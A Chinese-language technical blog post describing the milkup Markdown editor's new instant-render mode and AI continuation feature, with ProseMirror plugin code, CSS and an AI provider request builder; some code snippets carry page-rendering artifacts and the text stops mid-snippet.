<p>在这次合作中，我们为 milkup 带来了两个重要的功能更新：<strong>即时渲染模式（feat-ir）</strong> 和 <strong>AI 续写功能（feat-ai）</strong> 。这两个功能的加入，让 milkup 在 Markdown 编辑器领域迈出了重要的一步，不仅在编辑体验上向 Typora 看齐，更在智能化方向上实现了突破。</p>
<p>本文将从需求背景、功能特性、技术实现、对比分析等多个维度，详细介绍这两个功能的设计思路和实现细节。希望能为正在开发或使用 Markdown 编辑器的开发者和用户提供一些参考和启发。</p>
<hr/>
<h2 data-id="heading-1">一、项目背景与需求分析</h2>
<h3 data-id="heading-2">1.1 milkup 项目简介</h3>
<p>milkup 是一个现代化的桌面端 Markdown 编辑器，基于 Electron + Vue 3 + TypeScript 构建。项目的核心目标是提供一个<strong>功能强大、体验优雅、性能出色</strong>的 Markdown 编辑环境。</p>
<p><strong>核心技术栈：</strong></p>
<ul>
<li><strong>前端框架</strong>：Vue 3 + TypeScript</li>
<li><strong>编辑器核心</strong>：Milkdown（基于 ProseMirror）+ Crepe</li>
<li><strong>源码编辑器</strong>：CodeMirror 6</li>
<li><strong>桌面框架</strong>：Electron</li>
<li><strong>构建工具</strong>：Vite + esbuild</li>
<li><strong>包管理器</strong>：pnpm</li>
</ul>
<h3 data-id="heading-3">1.2 为什么需要即时渲染模式？</h3>
<p>在 Markdown 编辑器的发展历程中，编辑模式经历了几个阶段：</p>
<ol>
<li><strong>分栏预览模式</strong>（如早期的 MarkdownPad）：左侧源码，右侧预览，割裂感强</li>
<li><strong>纯所见即所得模式</strong>（如 Notion）：完全隐藏语法，失去了 Markdown 的简洁性</li>
<li><strong>即时渲染模式</strong>（如 Typora）：平衡了语法可见性和渲染效果</li>
</ol>
<p>Typora 的成功证明了即时渲染模式的优越性：</p>
<ul>
<li><strong>写作流畅性</strong>：不需要在源码和预览之间切换视线</li>
<li><strong>语法可控性</strong>：需要时可以看到和编辑原始语法</li>
<li><strong>视觉舒适性</strong>：大部分时间看到的是渲染后的效果</li>
</ul>
<p>然而，Typora 是闭源软件，且已经停止免费更新。市面上缺少一个<strong>开源、现代化、可扩展</strong>的即时渲染编辑器。这就是 feat-ir 分支的诞生背景。</p>
<h3 data-id="heading-4">1.3 为什么需要 AI 续写功能？</h3>
<p>随着 AI 技术的发展，智能写作辅助已经成为现代编辑器的标配：</p>
<ul>
<li><strong>Cursor</strong>、<strong>GitHub Copilot</strong> 在代码编辑领域大放异彩</li>
<li><strong>Notion AI</strong>、<strong>飞书妙记</strong> 在文档编辑领域提供智能补全</li>
<li><strong>Grammarly</strong> 在英文写作领域提供语法建议</li>
</ul>
<p>但在 Markdown 编辑器领域，AI 集成还相对滞后。大多数 Markdown 编辑器要么完全不支持 AI，要么只是简单地调用 API 生成文本，缺乏对 Markdown 结构的理解。</p>
<p>feat-ai 分支的目标是：</p>
<ul>
<li><strong>结构化理解</strong>：理解文档的标题层级、上下文关系</li>
<li><strong>多提供商支持</strong>：支持 OpenAI、Claude、Gemini、Ollama 等多种 AI 服务</li>
<li><strong>无缝集成</strong>：像代码补全一样自然，不打断写作流程</li>
<li><strong>本地优先</strong>：支持 Ollama 等本地模型，保护隐私</li>
</ul>
<hr/>
<h2 data-id="heading-5">二、feat-ir：即时渲染模式详解</h2>
<h3 data-id="heading-6">2.1 功能特性</h3>
<p>feat-ir 分支实现了类似 Typora 的即时渲染模式，核心特性包括：</p>
<h4 data-id="heading-7">2.1.1 智能源码显示</h4>
<p>当光标移动到 Markdown 语法元素时，自动显示该元素的源码语法：</p>
<ul>
<li>
<p><strong>行内标记（Marks）</strong> ：</p>
<ul>
<li><code>**加粗**</code> → 光标进入时显示前后的 <code>**</code></li>
<li><code>*斜体*</code> → 显示前后的 <code>*</code></li>
<li><code>`代码`</code> → 显示前后的 <code>`</code></li>
<li><code>~~删除线~~</code> → 显示前后的 <code>~~</code></li>
<li><code>[链接文本](URL)</code> → 显示 <code>[]()</code> 结构</li>
</ul>
</li>
<li>
<p><strong>块级元素（Nodes）</strong> ：</p>
<ul>
<li>标题：显示对应数量的 <code>#</code> 符号（如 <code># </code>表示一级标题）</li>
<li>图片：显示 <code>![alt](milkup:///RDpcb3BlbnNvdXJjZVxtaWxrdXBcbWlsa3Vw77ya5qGM6Z2i56uvIG1hcmtkb3duIEFJ57ut5YaZ5ZKM5Y2z5pe25riy5p+TLm1k/src)</code> 完整语法</li>
</ul>
</li>
</ul>
<h4 data-id="heading-8">2.1.2 即时编辑能力</h4>
<p>不仅可以看到源码，还可以直接编辑：</p>
<ul>
<li><strong>链接 URL 编辑</strong>：点击 URL 部分可以直接修改链接地址</li>
<li><strong>图片属性编辑</strong>：可以修改图片的 alt 文本和 src 路径</li>
<li><strong>实时生效</strong>：编辑完成后按 Enter 或失焦，修改立即生效</li>
</ul>
<h4 data-id="heading-9">2.1.3 键盘导航</h4>
<p>提供流畅的键盘操作体验：</p>
<ul>
<li><code>ArrowLeft/Right</code>：在源码编辑器和渲染视图之间切换焦点</li>
<li><code>Enter</code>：提交编辑并返回渲染视图</li>
<li>自动跳出：光标移出语法元素时，自动隐藏源码</li>
</ul>
<h3 data-id="heading-10">2.2 实现原理</h3>
<h4 data-id="heading-11">2.2.1 ProseMirror 装饰器系统</h4>
<p>即时渲染的核心是 ProseMirror 的 <strong>Decoration（装饰器）</strong> 系统。装饰器允许我们在不修改文档结构的情况下，在视图层添加额外的 DOM 元素。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 核心插件结构</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> sourceOnFocusPlugin = $prose(<span class="hljs-function">(<span class="hljs-params">ctx</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Plugin</span>({
    <span class="hljs-attr">state</span>: {
      <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>;
      },
      <span class="hljs-title function_">apply</span>(<span class="hljs-params">tr, oldState</span>) {
        <span class="hljs-keyword">const</span> { selection } = tr;
        <span class="hljs-keyword">const</span> <span class="hljs-attr">decorations</span>: <span class="hljs-title class_">Decoration</span>[] = [];

        <span class="hljs-comment">// 根据光标位置动态生成装饰器</span>
        <span class="hljs-comment">// ...</span>

        <span class="hljs-keyword">return</span> <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-title function_">create</span>(tr.<span class="hljs-property">doc</span>, decorations);
      }
    },
    <span class="hljs-attr">props</span>: {
      <span class="hljs-title function_">decorations</span>(<span class="hljs-params">state</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getState</span>(state);
      }
    }
  });
});
</code></pre>
<p><strong>装饰器的优势：</strong></p>
<ul>
<li><strong>非侵入性</strong>：不修改文档的实际内容</li>
<li><strong>高性能</strong>：只在视图层渲染，不影响数据层</li>
<li><strong>灵活性</strong>：可以动态添加、移除装饰器</li>
</ul>
<h4 data-id="heading-12">2.2.2 Marks 处理策略</h4>
<p>对于行内标记（如加粗、斜体、链接），我们需要在文本前后添加语法符号：</p>
<p><strong>实现思路：</strong></p>
<ol>
<li><strong>遍历光标位置的 Marks</strong>：获取当前光标所在位置的所有标记</li>
<li><strong>计算标记范围</strong>：找到每个标记的起始和结束位置</li>
<li><strong>创建装饰器</strong>：在起始位置前和结束位置后插入语法符号</li>
</ol>
<p><strong>以链接为例：</strong></p>
<pre><code class="hljs language-ini" lang="ini">// 处理链接标记
if (<span class="hljs-attr">mark.type.name</span> === <span class="hljs-string">"link"</span>) {
  const <span class="hljs-attr">href</span> = mark.attrs.href || <span class="hljs-string">""</span><span class="hljs-comment">;</span>

  // 创建前缀 <span class="hljs-section">[
  const prefixSpan = document.createElement("span");
  prefixSpan.className = "md-source";
  prefixSpan.textContent = "[";

  // 创建后缀 ]</span>(URL)
  const <span class="hljs-attr">suffixSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">suffixSpan.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">suffixSpan.textContent</span> = <span class="hljs-string">"]("</span><span class="hljs-comment">;</span>

  // 创建可编辑的 URL 部分
  const <span class="hljs-attr">urlSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">urlSpan.className</span> = <span class="hljs-string">"md-source-url-editable"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">urlSpan.contentEditable</span> = <span class="hljs-string">"true"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">urlSpan.textContent</span> = href<span class="hljs-comment">;</span>

  // 监听编辑事件
  urlSpan.addEventListener("blur", () =&gt; {
    const <span class="hljs-attr">newHref</span> = urlSpan.textContent || <span class="hljs-string">""</span><span class="hljs-comment">;</span>
    if (newHref !== href) {
      // 更新文档中的链接
      view.dispatch(
        view.state.tr
          .removeMark(start, end, mark.type)
          .addMark(start, end, mark.type.create({ href: newHref }))
      )<span class="hljs-comment">;</span>
    }
  })<span class="hljs-comment">;</span>

  suffixSpan.appendChild(urlSpan)<span class="hljs-comment">;</span>

  const <span class="hljs-attr">closingSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">closingSpan.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">closingSpan.textContent</span> = <span class="hljs-string">")"</span><span class="hljs-comment">;</span>
  suffixSpan.appendChild(closingSpan)<span class="hljs-comment">;</span>

  // 添加装饰器
  decorations.push(
    Decoration.widget(start, () =&gt; prefixSpan),
    Decoration.widget(end, () =&gt; suffixSpan)
  )<span class="hljs-comment">;</span>
}
</code></pre>
<p><strong>关键点：</strong></p>
<ul>
<li>使用 <code>contentEditable="true"</code> 实现即时编辑</li>
<li>通过 <code>blur</code> 事件监听编辑完成</li>
<li>使用 ProseMirror 的 <code>transaction</code> 更新文档</li>
</ul>
<h4 data-id="heading-13">2.2.3 Nodes 处理策略</h4>
<p>对于块级元素（如标题、图片），处理方式略有不同：</p>
<p><strong>标题处理：</strong></p>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">node.type.name</span> === <span class="hljs-string">"heading"</span>) {
  const <span class="hljs-attr">level</span> = node.attrs.level || <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  const <span class="hljs-attr">prefix</span> = <span class="hljs-string">"#"</span>.repeat(level) + <span class="hljs-string">" "</span><span class="hljs-comment">;</span>

  const <span class="hljs-attr">span</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">span.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">span.textContent</span> = prefix<span class="hljs-comment">;</span>

  decorations.push(
    Decoration.widget($from.start(), () =&gt; span)
  )<span class="hljs-comment">;</span>
}
</code></pre>
<p><strong>图片处理：</strong></p>
<p>图片的处理更复杂，因为需要同时编辑 alt 文本和 src 路径：</p>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">node.type.name</span> === <span class="hljs-string">"image"</span>) {
  const { src, alt } = node.attrs<span class="hljs-comment">;</span>

  // 创建 !<span class="hljs-section">[
  const prefixSpan = document.createElement("span");
  prefixSpan.className = "md-source";
  prefixSpan.textContent = "![";

  // 创建可编辑的 alt
  const altSpan = document.createElement("span");
  altSpan.className = "md-source-editable";
  altSpan.contentEditable = "true";
  altSpan.textContent = alt || "";

  // 创建 ]</span>(milkup:///RDpcb3BlbnNvdXJjZVxtaWxrdXBcbWlsa3Vw77ya5qGM6Z2i56uvIG1hcmtkb3duIEFJ57ut5YaZ5ZKM5Y2z5pe25riy5p+TLm1k/
%20%20const%20middleSpan%<span class="hljs-attr">20</span>=%<span class="hljs-number">20</span>document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">middleSpan.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">middleSpan.textContent</span> = <span class="hljs-string">"]("</span><span class="hljs-comment">;</span>

  // 创建可编辑的 src
  const <span class="hljs-attr">srcSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">srcSpan.className</span> = <span class="hljs-string">"md-source-url-editable"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">srcSpan.contentEditable</span> = <span class="hljs-string">"true"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">srcSpan.textContent</span> = src || <span class="hljs-string">""</span><span class="hljs-comment">;</span>

  // 创建 )
  const <span class="hljs-attr">suffixSpan</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">suffixSpan.className</span> = <span class="hljs-string">"md-source"</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">suffixSpan.textContent</span> = <span class="hljs-string">")"</span><span class="hljs-comment">;</span>

  // 组合所有元素
  const <span class="hljs-attr">container</span> = document.createElement(<span class="hljs-string">"div"</span>)<span class="hljs-comment">;</span>
  container.append(prefixSpan, altSpan, middleSpan, srcSpan, suffixSpan)<span class="hljs-comment">;</span>

  decorations.push(
    Decoration.widget(pos, () =&gt; container)
  )<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-14">2.2.4 样式设计</h4>
<p>为了让源码显示既清晰又不突兀，我们设计了专门的样式：</p>
<pre><code class="hljs language-css" lang="css">// 源码基础样式
<span class="hljs-selector-class">.md-source</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color-<span class="hljs-number">4</span>);           // 使用较浅的颜色
  <span class="hljs-attribute">font-family</span>: <span class="hljs-built_in">var</span>(--milkup-font-code); // 等宽字体
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.6</span>;                         // 半透明
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--background-color-<span class="hljs-number">2</span>); // 浅色背景
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9em</span>;
}

// 可编辑的 URL 样式
<span class="hljs-selector-class">.md-source-url-editable</span> {
  <span class="hljs-attribute">display</span>: inline-block;
  <span class="hljs-attribute">outline</span>: none;
  <span class="hljs-attribute">cursor</span>: text;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> dashed <span class="hljs-built_in">var</span>(--border-color); // 虚线下划线提示可编辑
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">50px</span>;

  &amp;<span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--background-color-<span class="hljs-number">3</span>);
  }

  &amp;<span class="hljs-selector-pseudo">:focus</span> {
    <span class="hljs-attribute">border-bottom-style</span>: solid;
    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--background-color-<span class="hljs-number">3</span>);
  }
}
</code></pre>
<p><strong>设计原则：</strong></p>
<ul>
<li><strong>低对比度</strong>：使用半透明和浅色，不干扰阅读</li>
<li><strong>等宽字体</strong>：保持代码感，与正文区分</li>
<li><strong>交互提示</strong>：可编辑元素有明确的视觉反馈</li>
</ul>
<h3 data-id="heading-15">2.3 技术挑战与解决方案</h3>
<h4 data-id="heading-16">2.3.1 光标跳出问题</h4>
<p><strong>问题</strong>：当用户在可编辑的 URL 中按方向键时，光标可能被困在 <code>contentEditable</code> 元素中，无法跳出。</p>
<p><strong>解决方案</strong>：监听键盘事件，手动控制光标移动：</p>
<pre><code class="hljs language-ini" lang="ini">urlSpan.addEventListener("keydown", (e) =&gt; {
  if (<span class="hljs-attr">e.key</span> === <span class="hljs-string">"ArrowLeft"</span> &amp;&amp; urlSpan.selectionStart === <span class="hljs-number">0</span>) {
    // 光标在最左侧，按左键跳出
    e.preventDefault()<span class="hljs-comment">;</span>
    const <span class="hljs-attr">pos</span> = view.posAtDOM(urlSpan, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
    view.dispatch(view.state.tr.setSelection(TextSelection.create(view.state.doc, pos)))<span class="hljs-comment">;</span>
    view.focus()<span class="hljs-comment">;</span>
  } else if (<span class="hljs-attr">e.key</span> === <span class="hljs-string">"ArrowRight"</span> &amp;&amp; urlSpan.selectionEnd === urlSpan.textContent.length) {
    // 光标在最右侧，按右键跳出
    e.preventDefault()<span class="hljs-comment">;</span>
    const <span class="hljs-attr">pos</span> = view.posAtDOM(urlSpan, urlSpan.textContent.length)<span class="hljs-comment">;</span>
    view.dispatch(view.state.tr.setSelection(TextSelection.create(view.state.doc, pos + 1)))<span class="hljs-comment">;</span>
    view.focus()<span class="hljs-comment">;</span>
  } else if (<span class="hljs-attr">e.key</span> === <span class="hljs-string">"Enter"</span>) {
    // 按 Enter 提交并跳出
    e.preventDefault()<span class="hljs-comment">;</span>
    urlSpan.blur()<span class="hljs-comment">;</span>
  }
})<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-17">2.3.2 装饰器性能优化</h4>
<p><strong>问题</strong>：每次光标移动都重新计算所有装饰器，可能导致性能问题。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li><strong>增量更新</strong>：只在光标位置变化时更新装饰器</li>
<li><strong>缓存机制</strong>：缓存上一次的装饰器集合，避免重复计算</li>
<li><strong>范围限制</strong>：只处理光标附近的元素，不遍历整个文档</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">apply</span>(<span class="hljs-params">tr, oldState</span>) {
  <span class="hljs-comment">// 如果光标位置没变，直接返回旧状态</span>
  <span class="hljs-keyword">if</span> (!tr.<span class="hljs-property">docChanged</span> &amp;&amp; !tr.<span class="hljs-property">selectionSet</span>) {
    <span class="hljs-keyword">return</span> oldState;
  }

  <span class="hljs-comment">// 只处理光标附近 1000 字符范围内的元素</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-keyword">from</span>, to } = tr.<span class="hljs-property">selection</span>;
  <span class="hljs-keyword">const</span> rangeStart = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-keyword">from</span> - <span class="hljs-number">500</span>);
  <span class="hljs-keyword">const</span> rangeEnd = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(tr.<span class="hljs-property">doc</span>.<span class="hljs-property">content</span>.<span class="hljs-property">size</span>, to + <span class="hljs-number">500</span>);

  <span class="hljs-comment">// 只在这个范围内查找需要装饰的元素</span>
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-18">2.3.3 与其他插件的兼容性</h4>
<p><strong>问题</strong>：装饰器可能与其他插件（如拼写检查、语法高亮）冲突。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li><strong>装饰器优先级</strong>：使用 ProseMirror 的 <code>spec.key</code> 设置优先级</li>
<li><strong>避免重叠</strong>：检测装饰器是否重叠，避免覆盖</li>
<li><strong>事件隔离</strong>：使用 <code>stopPropagation</code> 防止事件冒泡</li>
</ol>
<hr/>
<h2 data-id="heading-19">三、feat-ai：AI 续写功能详解</h2>
<h3 data-id="heading-20">3.1 功能特性</h3>
<p>feat-ai 分支为 milkup 带来了智能续写能力，让 AI 成为你的写作助手。</p>
<h4 data-id="heading-21">3.1.1 多 AI 提供商支持</h4>
<p>支持主流的 AI 服务提供商：</p>
<ul>
<li><strong>OpenAI</strong>：GPT-3.5-turbo、GPT-4、GPT-4-turbo</li>
<li><strong>Anthropic</strong>：Claude 3 Haiku、Claude 3 Sonnet、Claude 3 Opus</li>
<li><strong>Google</strong>：Gemini Pro、Gemini Pro Vision</li>
<li><strong>Ollama</strong>：支持本地运行的开源模型（Llama 2、Mistral、Qwen 等）</li>
<li><strong>自定义 API</strong>：兼容 OpenAI API 格式的任何服务</li>
</ul>
<p><strong>配置界面：</strong></p>
<p>用户可以在设置中轻松配置 AI 服务：</p>
<ul>
<li>选择提供商</li>
<li>输入 API Key</li>
<li>设置 Base URL（用于代理或自定义服务）</li>
<li>选择模型</li>
<li>调整温度参数（控制创造性）</li>
<li>设置防抖延迟（控制触发频率）</li>
</ul>
<h4 data-id="heading-22">3.1.2 结构化上下文理解</h4>
<p>AI 续写不是简单地续接文本，而是理解文档的结构：</p>
<p><strong>提取的上下文信息：</strong></p>
<ol>
<li><strong>文件名</strong>：了解文档主题</li>
<li><strong>标题层级</strong>：理解文档结构和当前章节</li>
<li><strong>前文内容</strong>：分析写作风格和上下文</li>
<li><strong>光标位置</strong>：确定续写的起点</li>
</ol>
<p><strong>示例：</strong></p>
<p>假设你正在写一篇技术博客：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># Vue 3 组合式 API 最佳实践</span>

<span class="hljs-section">## 一、为什么选择组合式 API</span>

组合式 API 是 Vue 3 引入的新特性，它提供了更灵活的代码组织方式。

<span class="hljs-section">## 二、核心概念</span>

<span class="hljs-section">### 2.1 响应式系统</span>

Vue 3 的响应式系统基于 Proxy，相比 Vue 2 的 Object.defineProperty 有以下优势：
<span class="hljs-bullet">-</span> 可以检测属性的添加和删除
<span class="hljs-bullet">-</span> 可以检测数组索引和长度的变化
<span class="hljs-bullet">-</span> [光标在这里]
</code></pre>
<p>AI 会理解：</p>
<ul>
<li>这是一篇关于 Vue 3 的技术文章</li>
<li>当前在讨论响应式系统的优势</li>
<li>前面已经列举了两个优势</li>
<li>应该继续列举更多优势或展开说明</li>
</ul>
<h4 data-id="heading-23">3.1.3 智能触发机制</h4>
<p><strong>防抖策略：</strong></p>
<ul>
<li>用户停止输入后等待 1-3 秒（可配置）</li>
<li>避免频繁调用 API，节省成本</li>
<li>不打断用户的写作流程</li>
</ul>
<p><strong>触发条件：</strong></p>
<ul>
<li>光标在段落末尾</li>
<li>前面有足够的上下文（至少 50 个字符）</li>
<li>不在代码块、表格等特殊区域内</li>
</ul>
<p><strong>取消机制：</strong></p>
<ul>
<li>用户继续输入时，自动取消当前请求</li>
<li>文档内容变化时，清除已显示的建议</li>
</ul>
<h4 data-id="heading-24">3.1.4 优雅的 UI 集成</h4>
<p><strong>显示方式：</strong></p>
<ul>
<li>续写建议以半透明文本显示在光标后</li>
<li>使用不同的颜色和字体样式，与正文区分</li>
<li>不占用实际的文档空间</li>
</ul>
<p><strong>交互方式：</strong></p>
<ul>
<li>按 <code>Tab</code> 键接受建议</li>
<li>按 <code>Esc</code> 键拒绝建议</li>
<li>继续输入自动清除建议</li>
</ul>
<p><strong>视觉设计：</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.ai-completion-suggestion</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color-<span class="hljs-number">3</span>);
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>;
  <span class="hljs-attribute">font-style</span>: italic;
  <span class="hljs-attribute">pointer-events</span>: none; // 不影响鼠标交互
  user-select: none;    // 不可选中
}
</code></pre>
<h3 data-id="heading-25">3.2 实现原理</h3>
<h4 data-id="heading-26">3.2.1 插件架构</h4>
<p>AI 续写功能通过 ProseMirror 插件实现，核心文件位于 <code>src/renderer/components/editor/plugins/completionPlugin.ts</code>。</p>
<p><strong>插件状态管理：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> completionPlugin = $prose(<span class="hljs-function">(<span class="hljs-params">ctx</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> completionKey = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PluginKey</span>(<span class="hljs-string">"completion"</span>);

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Plugin</span>({
    <span class="hljs-attr">key</span>: completionKey,
    <span class="hljs-attr">state</span>: {
      <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> {
          <span class="hljs-attr">decoration</span>: <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>,
          <span class="hljs-attr">suggestion</span>: <span class="hljs-literal">null</span>,
          <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
        };
      },
      <span class="hljs-title function_">apply</span>(<span class="hljs-params">tr, value</span>) {
        <span class="hljs-comment">// 文档内容变化时清除建议</span>
        <span class="hljs-keyword">if</span> (tr.<span class="hljs-property">docChanged</span>) {
          <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">decoration</span>: <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>,
            <span class="hljs-attr">suggestion</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
          };
        }

        <span class="hljs-comment">// 手动更新（如 AI 返回结果）</span>
        <span class="hljs-keyword">const</span> meta = tr.<span class="hljs-title function_">getMeta</span>(completionKey);
        <span class="hljs-keyword">if</span> (meta) {
          <span class="hljs-keyword">return</span> meta;
        }

        <span class="hljs-keyword">return</span> value;
      }
    },
    <span class="hljs-attr">props</span>: {
      <span class="hljs-title function_">decorations</span>(<span class="hljs-params">state</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getState</span>(state)?.<span class="hljs-property">decoration</span>;
      },
      <span class="hljs-title function_">handleKeyDown</span>(<span class="hljs-params">view, event</span>) {
        <span class="hljs-comment">// 处理 Tab 键接受建议</span>
        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> === <span class="hljs-string">"Tab"</span>) {
          <span class="hljs-keyword">const</span> state = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getState</span>(view.<span class="hljs-property">state</span>);
          <span class="hljs-keyword">if</span> (state?.<span class="hljs-property">suggestion</span>) {
            event.<span class="hljs-title function_">preventDefault</span>();
            <span class="hljs-keyword">const</span> tr = view.<span class="hljs-property">state</span>.<span class="hljs-property">tr</span>.<span class="hljs-title function_">insertText</span>(
              state.<span class="hljs-property">suggestion</span>,
              view.<span class="hljs-property">state</span>.<span class="hljs-property">selection</span>.<span class="hljs-property">to</span>
            );
            tr.<span class="hljs-title function_">setMeta</span>(completionKey, {
              <span class="hljs-attr">decoration</span>: <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>,
              <span class="hljs-attr">suggestion</span>: <span class="hljs-literal">null</span>,
              <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
            });
            view.<span class="hljs-title function_">dispatch</span>(tr);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
          }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
    }
  });
});
</code></pre>
<p><strong>插件状态包含三个字段：</strong></p>
<ul>
<li><code>decoration</code>：用于显示建议的装饰器集合</li>
<li><code>suggestion</code>：当前的建议文本</li>
<li><code>loading</code>：是否正在请求 AI</li>
</ul>
<h4 data-id="heading-27">3.2.2 多 AI 提供商集成</h4>
<p>AI 服务层位于 <code>src/renderer/services/ai.ts</code>，通过统一的接口支持多个提供商。</p>
<p><strong>服务接口设计：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AIService</span> {
  <span class="hljs-function"><span class="hljs-type">static</span> async <span class="hljs-title">complete</span><span class="hljs-params">(context: APIContext)</span>: Promise&lt;CompletionResponse&gt; {</span>
    <span class="hljs-type">const</span> config = <span class="hljs-built_in">useAIConfig</span>().config.value;

    <span class="hljs-keyword">if</span> (!config.enabled || !config.apiKey) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"AI 服务未配置"</span>);
    }

    <span class="hljs-comment">// 根据提供商构建不同的请求</span>
    <span class="hljs-type">const</span> { url, headers, body } = <span class="hljs-keyword">this</span>.<span class="hljs-built_in">buildRequest</span>(config, context);

    <span class="hljs-comment">// 发送请求</span>
    <span class="hljs-type">const</span> response = await <span class="hljs-keyword">this</span>.<span class="hljs-built_in">request</span>(url, {
      method: <span class="hljs-string">"POST"</span>,
      headers,
      body: JSON.<span class="hljs-built_in">stringify</span>(body)
    });

    <span class="hljs-comment">// 解析响应</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.<span class="hljs-built_in">parseResponse</span>(response, config.provider);
  }
}
</code></pre>
<p><strong>各提供商的实现差异：</strong></p>
<ol>
<li><strong>OpenAI / 自定义 API</strong>：使用 <code>response_format</code> 强制 JSON 输出</li>
</ol>
<pre><code class="hljs language-css" lang="css">case "openai":
case <span class="hljs-string">"custom"</span>:
  return {
    url: `${config<span class="hljs-selector-class">.baseUrl</span>}/chat/completions`,
    headers: {
      "<span class="hljs-attribute">Content</span>-Type": <span class="hljs-string">"application/json"</span>,
      <span class="hljs-string">"Authorization"</span>: `Bearer ${config<span class="hljs-selector-class">.apiKey</span>}`
    },
    <span class="hljs-selector-tag">body</span>: {
      model: config.model,
      messages: [
        { role: <span class="hljs-string">"system"</span>, content: SYSTEM_PROMPT },
        { role: <span class="hljs-string">"user"</span>, content: userMessage }
      ],
      temperature: config.temperature,
      response_format: {
        type: <span class="hljs-string">"json_schema"</span>,
        json_schema: {
          name: <span class="hljs-string">"continuation"</span>,
          schema: {
            type: <span class="hljs-string">"object"</span>,
            properties: {
              continuation: { type: <span class="hljs-string">"string"</span> }
            },
            required: [<span class="hljs-string">"continuation"</span>]
          }
        }
      }
    }
